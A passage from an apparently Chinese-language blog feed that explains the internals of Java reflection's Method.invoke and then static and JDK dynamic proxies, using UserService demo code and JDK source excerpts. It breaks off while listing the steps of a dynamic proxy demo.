&#125;</span><br><span class="line">        MethodAccessor ma = methodAccessor;             <span class="comment">// read volatile</span></span><br><span class="line">        <span class="keyword">if</span> (ma == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ma = acquireMethodAccessor();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ma.invoke(obj, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>override参数</strong></p>
<p>它是父类AccessibleObject的一个属性，AccessibleObject这个类有三个子类：构造函数、属性、方法。</p>
<img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512223546220.png" alt="image-20210512223546220" style="zoom:80%;">

<p>override这个值默认是false，但是我们可以通过method.setAccessible(true)来改掉它的值。</p>
<p><strong>Reflection.quickCheckMemberAccess(clazz, modifiers)</strong></p>
<p>如果是override是默认值false，那么继续往下走。</p>
<p>我们这里假设：<strong>m.invoke(obj,args)</strong></p>
<p>参数：</p>
<ul>
<li><p>clazz：m所属类的Class对象 </p>
</li>
<li><p>args：m的所需参数</p>
</li>
</ul>
<p>这里<strong>quickCheckMemberAccess先检查Class对象是不是public的</strong>。</p>
<ul>
<li><p>如果是public,那么就跳出本方法；</p>
</li>
<li><p>如果不是public,那继续来到Reflection.getCallerClass(1);</p>
<p>这是一个native方法，返回的是获取调用这个方法的Class对象，赋值给caller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; getCallerClass();</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><strong>checkAccess</strong></p>
<p>然后通过checkAccess(checkAccess(caller, clazz, obj, modifiers)做一次快速的权限校验</p>
<img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512225432055.png" alt="image-20210512225432055" style="zoom:80%;">

<p>不难看出，还进行了一个很简单的缓冲机制，只适用于一个类的重复调用。</p>
<p><strong>MethodAccessor ma = methodAccessor;</strong></p>
<p>接下来是重头戏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">MethodAccessor ma = methodAccessor;             <span class="comment">// read volatile</span></span><br><span class="line"><span class="keyword">if</span> (ma == <span class="keyword">null</span>) &#123;</span><br><span class="line">	ma = acquireMethodAccessor();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ma.invoke(obj, args);</span><br></pre></td></tr></table></figure>

<p>首先要了解Method对象的基本构成，每个Java方法有且只有一个Method对象作为root，它相当于根对象，对用户不可见。当我们创建Method对象时，我们代码中获得的Method对象都相当于它的副本（或引用）。root对象持有一个MethodAccessor对象，所以所有获取到的Method对象都共享这一个MethodAccessor对象，因此必须保证它在内存中的可见性。<br>当第一次调用一个Java方法对应的Method对象的invoke()方法之前，实现调用逻辑的MethodAccessor对象还没有创建(第一次调用，methodAccessor属性为null)，所以通过<code>reflectionFactory</code>创建MethodAccessor并更新给root，然后调用<code>MethodAccessor.invoke()</code>完成反射调用。</p>
<p>具体细看，可以看到invoke方法实际是委派给了MethodAccessor类型的ma对象来处理。MethodAccessor是一个接口，主要有两个实现类。</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512231233941.png" alt="image-20210512231233941"></p>
<p>一个委派实现(<code>DelegatingMethodAccessorImpl</code>)，一个本地实现(<code>NativeMethodAccessorImpl</code>)。这里调用的委派实现主要是为了在本地实现和动态实现之间做切换。考虑到许多反射调用仅会执行一次，Java虚拟机设置了一个阈值15(是从0开始计算,&gt;15)：</p>
<ul>
<li>当某个反射调用的调用次数&lt;=15 时，采用本地实现；</li>
<li>当大于15时，便开始动态生成字节码，并将委派实现的委派对象切换至动态实现。这个过程我们称之为Infation。</li>
</ul>
<p>这里我们以<code>NativeMethodAccessorImpl</code>本地实现为例：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512232314719.png" alt="image-20210512232314719"></p>
<p>每次调用其invoke时会做一个累加，判断是否到达阙值，如果没有则调用native的invoke0方法，当超过时则调用<code>MethodAccessorGenerator.generateMethod()</code>，并将其设置到<code>DelegatingMethodAccessorImpl</code>的delegate，这样下次就会直接调用到动态实现的位置。</p>
<p>m.invoke(o，args)</p>
<p>invoke0参数：</p>
<ul>
<li>this.method 就是m</li>
<li>var1就是o，如果m是静态方法的话，这里写null也可以</li>
<li>var2就是args参数</li>
</ul>
<p>我们重点分析一下invoke0这个native方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0</span><br><span class="line">(JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> JVM_InvokeMethod(env, m, obj, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>借用ruilin的图，继续看JVM_InvokeMethod方法：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512232520503.png" alt="image-20210512232520503"></p>
<p>发现提到了oop，简单写一下oop-klass理解：</p>
<p>JVM就是用这种方式，将一个对象的数据和对象模型进行分离。普遍意义上来说，我们说持有一个对象的引用，指的是图中的handle(存放在栈区)，它是oop(存放在堆区)的一个封装。</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512232900943.png" alt="image-20210512232900943"></p>
<p>关键点是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL);</span><br></pre></td></tr></table></figure>

<p>跟进hotspot/src/share/vm/runtime/reflection.cpp</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512232631973.png" alt="image-20210512232631973"></p>
<p>Reflection::invoke_method()中接受的method_mirror(oop)就是我们要反射调用的方法。然后代码调用了Reflection::invoke()，跟进之后最终到JavaCalls::call()执行</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512233149513.png" alt="image-20210512233149513"></p>
<p>最后的<code>os_exception_wrapper</code>其实就是调用了<code>call_help</code>，也就是说本地实现的<strong>反射最终的方法执行是通过<code>JavaCalls::call_helper</code>方法来完成的</strong>。</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20210512233242268.png" alt="image-20210512233242268"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反射，永远滴神！</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java反射</tag>
      </tags>
  </entry>
  <entry>
    <title>动态代理那点事</title>
    <url>/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>今天来总结Java代理。分为静态和动态。</p>
<a id="more"></a>

<h1 id="什么是代理？"><a href="#什么是代理？" class="headerlink" title="什么是代理？"></a>什么是代理？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>给目标对象提供一个代理对象，并由代理对象控制目标对象的引用。</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ol>
<li>通过引入代理对象的方式来简介访问目标对象，防止直接访问目标对象给系统带来的不必要复杂性；</li>
<li>通过代理对象对原有的业务增强；</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>代理对象和真实对象<strong>必须实现同一个接口</strong>；</li>
<li>代理对象只是搬运工，代理对象必须包含真实的对象；</li>
</ol>
<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。</p>
<p>代理模式是一种结构型设计模式。</p>
<p>代理模式角色分为 3 种：</p>
<p><strong>Subject</strong>(接口)：</p>
<p>定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法，其实就是一个功能接口；</p>
<p><strong>RealSubject</strong>（真实类）：真正实现业务逻辑的类，这就是真实的对象；</p>
<p><strong>Proxy</strong>（代理类）：用来代理和封装真实主题；</p>
<p>三者关系如图所示：</p>
<p><img src="../images/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/167cff3ba753f7f8.png" alt="img"></p>
<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
<ul>
<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。（这个很牛逼）</li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>下面写个小demo看一下。</p>
<p>编写一个接口 UserService ，以及该接口的一个实现类 UserServiceImpl：</p>
<p>接口 UserService：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span></span>;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口实现类UserServiceImpl：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"查询 selectById"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"更新 update"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理类UserServiceProxy：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserService target; <span class="comment">// 包含被代理的对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserServiceProxy</span><span class="params">(UserService target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        target.select();    <span class="comment">// 这里才实际调用真实主题角色的方法</span></span><br><span class="line">        after();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        target.update();    <span class="comment">// 这里才实际调用真实主题角色的方法</span></span><br><span class="line">        after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;     <span class="comment">// 在执行方法之前执行</span></span><br><span class="line">        System.out.println(String.format(<span class="string">"log start time [%s] "</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;      <span class="comment">// 在执行方法之后执行</span></span><br><span class="line">        System.out.println(String.format(<span class="string">"log end time [%s] "</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        UserService user = (UserService) <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        UserService proxy = <span class="keyword">new</span> UserServiceProxy(user);</span><br><span class="line">				<span class="comment">//调用代理实现类实现的方法</span></span><br><span class="line">        proxy.select();</span><br><span class="line">        proxy.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span> start time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line">查询 selectById</span><br><span class="line"><span class="built_in">log</span> end time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line"><span class="built_in">log</span> start time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line">更新 update</span><br><span class="line"><span class="built_in">log</span> end time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line"></span><br><span class="line">Process finished with <span class="built_in">exit</span> code 0</span><br></pre></td></tr></table></figure>

<p>模板：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">接口 obj = <span class="keyword">new</span> 接口实现类（）；</span><br><span class="line">代理类 proxy = <span class="keyword">new</span> 代理类（obj）；</span><br><span class="line">proxy.method_a();</span><br><span class="line">proxy.method_b();</span><br></pre></td></tr></table></figure>

<h2 id="静态代理的缺点"><a href="#静态代理的缺点" class="headerlink" title="静态代理的缺点"></a>静态代理的缺点</h2><p>虽然静态代理实现简单，且不侵入原代码，但是，当场景稍微复杂一些的时候，静态代理的缺点也会暴露出来。</p>
<p>1/当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式：</p>
<ul>
<li>只维护一个代理类，由这个代理类实现多个接口，但是这样就导致<strong>代理类过于庞大</strong></li>
<li>新建多个代理类，每个目标对象对应一个代理类，但是这样会<strong>产生过多的代理类</strong></li>
</ul>
<p>2/当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，<strong>不易维护</strong>。</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="为什么类可以动态的生成？"><a href="#为什么类可以动态的生成？" class="headerlink" title="为什么类可以动态的生成？"></a>为什么类可以动态的生成？</h2><p>Java虚拟机类加载过程主要分为五个阶段：加载、验证、准备、解析、初始化。其中<strong>加载</strong>阶段需要完成以下3件事情：</p>
<ol>
<li>通过一个类的全限定名来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在内存中生成一个代表这个类的 <code>java.lang.Class</code> 对象，作为方法区这个类的各种数据访问入口</li>
</ol>
<p>由于虚拟机规范对这3点要求并不具体，所以实际的实现是非常灵活的，关于第1点，<strong>获取类的二进制字节流</strong>（class字节码）就有很多途径：</p>
<ul>
<li>从ZIP包获取，这是JAR、EAR、WAR等格式的基础</li>
<li>从网络中获取，典型的应用是 Applet</li>
<li><strong>运行时计算生成</strong>，这种场景使用最多的是动态代理技术，在 <code>java.lang.reflect.Proxy</code> 类中，就是用了 <code>ProxyGenerator.generateProxyClass</code> 来为特定接口生成形式为 <code>*$Proxy</code> 的代理类的二进制字节流</li>
<li>由其它文件生成，典型应用是JSP，即由JSP文件生成对应的Class类</li>
<li>从数据库中获取等等</li>
</ul>
<p>所以，动态代理就是想办法，根据接口或目标对象，计算出代理类的字节码，然后再加载到JVM中使用。但是如何计算？如何生成？情况也许比想象的复杂得多，我们需要借助现有的方案。</p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><h3 id="两个核心类"><a href="#两个核心类" class="headerlink" title="两个核心类"></a>两个核心类</h3><p>创建动态代理类会使用到</p>
<p><code>java.lang.reflect.Proxy</code>类</p>
<p>和</p>
<p><code>java.lang.reflect.InvocationHandler</code>接口。</p>
<p><strong>目标类必须实现接口，没有接口只能用CGLIB。</strong></p>
<p>java.lang.reflect.Proxy主要用于生成动态代理类Class、创建代理类实例，该类实现了java.io.Serializable接口。</p>
<ol>
<li><p>Proxy</p>
<p>是<em>类</em>，是调度器，帮助调度服务的员工，<strong>是所有动态代理的父类</strong>，它只管new实例出来，别的不插手。</p>
</li>
<li><p>InvocationHandler</p>
<p>是接口，用于调用<code>Proxy</code>类生成的代理类方法，该类<strong>只有</strong>一个<code>invoke</code>方法。</p>
<p>只管“new的实例”的执行功能，别的不插手。</p>
</li>
</ol>
<p><strong>在程序运行过程中产生的代理类的对象，其实就是通过反射机制来生成的。</strong></p>
<p>JDK提供的代理只能针对接口做代理。</p>
<p><strong>每一个动态代理类都必须要实现InvocationHandler这个接口。</strong></p>
<p><strong>它的invoke方法表示代理对象要执行的功能代码。</strong></p>
<h3 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h3><p>Proxy这个类的作用就是用来<strong>动态创建一个代理对象类</strong>，它提供了许多的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">copypackage java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2020/1/15</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省去成员变量和部分类方法...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取动态代理处理类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy 返回调用处理程序的代理实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 代理实例的调用处理程序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">getInvocationHandler</span><span class="params">(Object proxy)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     指定动态代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> h          动态代理处理类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回动态代理生成的代理类实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     定义代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 代理类要实现的接口列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测某个类是否是动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cl 要测试的类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isProxyClass</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>) &amp;&amp; <span class="title">proxyClassCache</span>.<span class="title">containsValue</span>(<span class="title">cl</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向指定的类加载器中定义一个类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader 类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b      类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> off    截取开始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> len    截取长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JVM创建的类Class对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class <span class="title">defineClass0</span><span class="params">(ClassLoader loader, String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中用的最多的就是 <code>newProxyInstance ()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类实例，也就是创建代理对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     指定动态代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> h          动态代理处理类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回动态代理生成的代理类实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br></pre></td></tr></table></figure>

<p><strong>这个方法的作用就是得到一个动态代理对象</strong>，其中接收三个参数：</p>
<p><strong>loader</strong>：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载；</p>
<p>实现类a，a.getClass().getClassLoader()，获取目标对象的类加载器。</p>
<p><strong>interfaces参数</strong>：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了；</p>
<p>目标对象实现的接口，也是反射获取的。a.getClass().getInterfaces()</p>
<p><strong>h</strong>：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上；</p>
<p>是我们自己写的，代理类要完成的功能，体现在invoke函数里。</p>
<p>返回值：就是代理对象。 把三个参数当作原料，加工出来代理对象。</p>
<h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p>作为InvocationHandler接口唯一的方法，invoke ()方法定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span></span><br></pre></td></tr></table></figure>

<p>proxy参数：jdk创建的代理对象，无需赋值；</p>
<p>method参数：目标类中的方法；</p>
<p>args参数：Method参数中，接收的参数；</p>
<p><strong>以上三个参数都是jdk帮忙创建的，无需人为赋值。</strong></p>
<p>怎么用：</p>
<ol>
<li>创建一个类，来实现InvocationHandler</li>
<li>重写invoke方法，把原来静态代理中代理类要完成的功能，放在重写之后的invoke方法中实现。</li>
</ol>
<p><strong>invoke方法表示代理对象要执行的功能代码。</strong></p>
<p>还需要一个Object字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object target;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">&#125;</span><br><span class="line">ret = method.invoke(target,args);</span><br></pre></td></tr></table></figure>



<h2 id="newProxyInstance-源码"><a href="#newProxyInstance-源码" class="headerlink" title="newProxyInstance 源码"></a>newProxyInstance 源码</h2><p>看看<code>java.lang.reflect.Proxy#newProxyInstance</code>里面怎么实现的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          InvocationHandler h)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (h == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up or generate the designated proxy class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="comment">// stack walk magic: do not refactor</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Invoke its constructor with the designated invocation handler.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);</span><br><span class="line">            <span class="keyword">final</span> InvocationHandler ih = h;</span><br><span class="line">            SecurityManager sm = System.getSecurityManager();</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="keyword">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;</span><br><span class="line">                <span class="comment">// create proxy instance with doPrivilege as the proxy class may</span></span><br><span class="line">                <span class="comment">// implement non-public interfaces that requires a special permission</span></span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Object&gt;() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> newInstance(cons, ih);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> newInstance(cons, ih);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里面有一个关键函数是<code>Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</code>，这一步主要就是生成代理类。</p>
<blockquote>
<p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p>
</blockquote>
<h2 id="动态代理Demo"><a href="#动态代理Demo" class="headerlink" title="动态代理Demo"></a>动态代理Demo</h2><p>实现动态代理的步骤：</p>
<ol>
<li>创建接口，定义目标类要完成的功能</li>
<li>创建目标类来实现接口</li>
